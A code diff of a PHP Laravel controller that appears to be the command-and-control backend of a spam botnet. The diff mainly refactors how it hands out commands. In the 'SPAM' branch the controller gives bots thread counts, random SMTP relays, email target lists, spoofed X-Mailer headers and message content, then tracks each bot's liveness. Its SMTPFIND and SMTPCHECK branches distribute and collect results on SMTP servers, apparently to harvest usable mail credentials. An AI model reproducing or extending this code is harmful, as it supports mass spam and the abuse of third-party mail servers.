@@ -14,6 +14,7 @@ use App\smtplistpiece;
 use Carbon\Carbon;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Storage;
 
 class CommandController extends Controller
@@ -70,63 +71,66 @@ class CommandController extends Controller
 
         if ($statusAdmin->status == 'SPAM') {
 
+            $result = [];
+
             $settings = MailSettings::find(1);
 
-            echo "3\n";
-
-            echo $settings->thread_count . "\n";
+            $result[] = '3';
+            $result[] = $settings->thread_count;
 
             $smtp = SMTP::orderByRaw("RAND()")->take($settings->smtp_count)->get();
+            $string = "";
+
             foreach ($smtp as $item) {
-                echo $item->domen . "\t";
-            }
-            echo "\n";
-
-            $files = Storage::allFiles(config('config.emails.mails'));
-            if (count($files) > 0) {
-                $filename = "botid-" . $bot->id . "-file" . time('U') . '.txt';
-                Storage::move($files[0], config('config.emails.go_mails') . "/" . $filename);
-                echo url('download/go-mails/' . $filename);
-                echo "\n";
-            } else {
-                echo "\n";
+                $string .= $item->domen . "\t";
             }
 
-            $files = Storage::allFiles(config('config.fromname'));
-            if (count($files) > 0) {
-                echo url('download/' . $files[rand(0, count($files) - 1)]);
-                echo "\n";
+            $result[] = $string;
+            try {
+                $files = scandir(storage_path('app') . '/' . config('config.emails.mails'));
+                if (File::exists(storage_path('app') . '/' . config('config.emails.mails') . '/' . $files[2])) {
+                    $filename = "botid-" . $bot->id . "-file" . time('U') . '.txt';
+                    copy(storage_path('app') . '/' . config('config.emails.mails') . '/' . $files[2], storage_path('app') . '/' . config('config.emails.go_mails') . '/' . $filename);
+                    unlink(storage_path('app') . '/' . config('config.emails.mails') . '/' . $files[2]);
+                    $result[] = url('download/go-mails/' . $filename);
+                }else{
+                    $result[] = "";
+                }
+            } catch (\Exception $e) {
+                $result[] = "";
+                echo 0;
+                exit();
+            }
+
+            $files =  scandir(storage_path('app') . '/' . config('config.fromname'));
+            if (count($files) > 2) {
+                $result[] = url('download/' . $files[rand(2, count($files) - 1)]);
             } else {
-                echo "\n";
+                $result[] = "";
             }
 
             if ($settings->send_attach != 0) {
-                $files = Storage::allFiles(config('config.attach'));
-                if (count($files) > 0) {
-                    echo url('download/' . $files[rand(0, count($files) - 1)]);
-                    echo "\n";
+                $files =  scandir(storage_path('app') . '/' . config('config.attach'));
+                if (count($files) > 2) {
+                    $result[] = url('download/' . $files[rand(2, count($files) - 1)]);
                 } else {
-                    echo "\n";
+                    $result[] = "";
                 }
             }
 
-            echo $settings->attach_name_macros . "\n";
-
-            echo $settings->x_mailer . "\n";
-
-            echo "macro1=" . $settings->macros1 . "\t" . "macro2=" . $settings->macros2 . "\t" . "macro3=" . $settings->macros3 . "\n";
-
-            echo $settings->emails_from_server . "\n";
-
-            echo $settings->message_theme . "\n";
-
-            echo $settings->message_text . "\n";
-
+            $result[] = $settings->attach_name_macros;
+            $result[] = $settings->x_mailer;
+            $result[] = "macro1=" . $settings->macros1 . "\t" . "macro2=" . $settings->macros2 . "\t" . "macro3=" . $settings->macros3;
+            $result[] = $settings->emails_from_server;
+            $result[] = $settings->message_theme;
+            $result[] = $settings->message_text;
+            echo implode(PHP_EOL, $result);
             $bot->bot_status = 1;
             $bot->otk = 0;
             $bot->life = 1;
             $bot->time = Carbon::now('Europe/Kiev');
             $bot->save();
+
         }
 
         if ($statusAdmin->status == 'SMTPCHECK') {
@@ -202,7 +206,6 @@ class CommandController extends Controller
         }
 
         if ($statusAdmin->status == 'SMTPFIND') {
-
             $settingsSMTP = FindSmtpSettings::find(1);
             $list = smtpfindpiece::where(['isget' => 0])->orderByRaw('RAND()')->take($settingsSMTP->count_emails)->get();
             if (count($list) > 0) {
@@ -267,11 +270,11 @@ class CommandController extends Controller
         $set = SettingsForCheckSMTP::find(1);
         $result = trim($request->get('result'));
 
-$nosmtp=$sent=$saved = $bad = 0;
+        $nosmtp = $sent = $saved = $bad = 0;
         if (isset($result) && strlen($result) > 3) {
 
             $resultArray = explode("\n", $result);
-$all = count($resultArray);
+            $all = count($resultArray);
             foreach ($resultArray as $value) {
                 $value = trim($value);
                 if (empty($value)) {
@@ -296,7 +299,7 @@ $all = count($resultArray);
                 Storage::append($logFile, $value . "\r\n");
 
                 $smtp = smtplistpiece::where(['smtp' => trim($smtp)])->first();
-                if($smtp != null) {
+                if ($smtp != null) {
                     $saved++;
                     $smtp->botid = 0;
                     $smtp->isget = 1;
@@ -304,7 +307,7 @@ $all = count($resultArray);
                     $smtp->status = strtoupper($status);
                     $smtp->errmsg = $status_err;
                     $smtp->save();
-                }else{
+                } else {
                     $nosmtp++;
                 }
             }
